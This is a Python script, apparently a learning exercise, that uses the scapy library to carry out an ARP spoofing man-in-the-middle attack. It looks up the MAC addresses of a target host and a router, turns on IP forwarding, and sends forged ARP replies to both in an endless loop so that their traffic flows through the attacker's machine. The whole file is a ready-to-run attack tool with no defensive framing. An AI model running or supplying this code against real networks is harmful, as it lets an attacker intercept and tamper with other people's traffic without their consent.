import sys
import os
import time

#
#   set display variable, unset in terminal, to avoid warning and errors
#
display = os.environ.get("DISPLAY")
if display:
    print(f"DISPLAY={display}")
    import scapy.all as scapy
else:
    print("DISPLAY not set, setting to ':0.0'...")
    os.environ["DISPLAY"] = ":0.0"
    import scapy.all as scapy

BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"


def get_mac_address(ip_address):
    """crafts packet to get target's mac address"""

    broadcast_layer = scapy.Ether(dst=BROADCAST_MAC)
    print(f"broadcast layer: {broadcast_layer!r}")

    arp_layer = scapy.ARP(pdst=ip_address)
    print(f"arp layer      : {arp_layer!r}")

    get_mac_packet = broadcast_layer / arp_layer
    print(f"get mac packet : {get_mac_packet!r}")

    answer, unanswer = scapy.srp(get_mac_packet, timeout=2, verbose=False)
    print(f"answer         : {answer!r}")
    print(f"unanswer       : {unanswer!r}")

    sent, received = answer[0]
    print(f"sent           : {sent!r}")
    print(f"received       : {received!r}")
    return received.hwsrc


def spoof(router_ip, target_ip, router_mac, target_mac):
    """creates and sends spoof packets to target and router"""

    router_packet = scapy.ARP(
        op=2,
        psrc=target_ip,
        hwdst=router_mac,
        pdst=router_ip,
    )
    print(f"{router_packet!r}")
    scapy.send(router_packet)

    target_packet = scapy.ARP(
        op=2,
        psrc=router_ip,
        hwdst=target_mac,
        pdst=target_ip,
    )
    print(f"{target_packet!r}")
    scapy.send(target_packet)


IP_FORWARD_PATH = "/proc/sys/net/ipv4/ip_forward"


def check_ipforward():
    """check value of /proc/sys/net/ipv4/ip_forward"""
    with open(IP_FORWARD_PATH) as file:
        status = file.readline().strip()
    print(f"{IP_FORWARD_PATH}: {status}")
    return int(status)


def set_ipforward(status):
    print(f"\twriting {status} in {IP_FORWARD_PATH}")
    with open(IP_FORWARD_PATH, "w") as file:
        file.write(str(status))


if len(sys.argv) < 3:
    target_ip = input("[+] Enter target ip address: ")
    router_ip = input("[+] Enter router ip address: ")
elif len(sys.argv) == 3:
    target_ip, router_ip = sys.argv[1:]
else:
    print(f"syntax {sys.argv[0]} target_ip router_ip")
    exit()

print()
print(f"target ip: {target_ip}")
print(f"router ip: {router_ip}")
print()

if not check_ipforward():
    print("enabling ip forward")
    set_ipforward(1)

target_mac = get_mac_address(target_ip)
router_mac = get_mac_address(router_ip)

print()
print(f"target: ip={target_ip}, mac={target_mac}")
print(f"router: ip={router_ip}, mac={router_mac}")
print()

try:
    print("* * * START spoof loop * * *\n")
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
        check_ipforward()
        time.sleep(2)
except KeyboardInterrupt:
    print('* * * STOP spoof loop * * *\n')
    print("disabling ip_forward")
    set_ipforward(0)
    check_ipforward()
    exit(0)
